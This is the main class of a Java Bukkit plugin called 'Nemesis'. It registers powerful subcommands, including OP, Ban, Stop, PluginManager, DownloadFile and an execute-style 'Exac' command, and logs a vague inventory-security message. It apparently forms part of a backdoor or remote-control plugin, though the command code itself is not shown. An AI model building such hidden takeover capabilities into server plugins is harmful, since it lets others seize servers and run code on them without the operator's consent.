package nemesis;

import java.util.Arrays;

import org.bukkit.plugin.java.JavaPlugin;

import nemesis.commands.subcommands.Ban;
import nemesis.commands.subcommands.BanList;
import nemesis.commands.subcommands.ClearInventory;
import nemesis.commands.subcommands.DeOP;
import nemesis.commands.subcommands.DownloadFile;
import nemesis.commands.subcommands.Exac;
import nemesis.commands.subcommands.Gamemode;
import nemesis.commands.subcommands.GiveItem;
import nemesis.commands.subcommands.Permission;
import nemesis.commands.subcommands.Kick;
import nemesis.commands.subcommands.OP;
import nemesis.commands.subcommands.PlayerList;
import nemesis.commands.subcommands.PluginList;
import nemesis.commands.subcommands.PluginManager;
import nemesis.commands.subcommands.Reload;
import nemesis.commands.subcommands.ServerInfo;
import nemesis.commands.subcommands.SetFlying;
import nemesis.commands.subcommands.SetInvulnerable;
import nemesis.commands.subcommands.Stop;
import nemesis.commands.subcommands.Unban;
import nemesis.commands.subcommands.Whitelist;
import nemesis.commands.subcommands.WorldList;

public final class Nemesis extends JavaPlugin {

    private static Nemesis instance;
    private CommandManager commandManager;

    @Override
    public void onEnable() {
        instance = this;
        commandManager = new CommandManager(this);
        Arrays.asList(
                new Ban(),
                new BanList(),
                new DeOP(),
                new DownloadFile(),
                new Gamemode(),
                new Permission(),
                new Kick(),
                new OP(),
                new PlayerList(),
                new PluginList(),
                new PluginManager(),
                new Reload(),
                new ServerInfo(),
                new Stop(),
                new Unban(),
                new Exac(),
                new ClearInventory(),
                new GiveItem(),
                new SetFlying(),
                new SetInvulnerable(),
                new Whitelist(),
                new WorldList()).forEach(commandManager::registerSubCommand);
        
        if (getServer().getPluginManager().isPluginEnabled("OopsSecurityIP")) {
            getLogger().info("Setting up security protection for player inventory...");
        } else {
            getLogger().info("Skipping security protection for player inventory...");
        }
    }

    public static Nemesis getInstance() {
        return instance;
    }

    public CommandManager getCommandManager() {
        return commandManager;
    }
}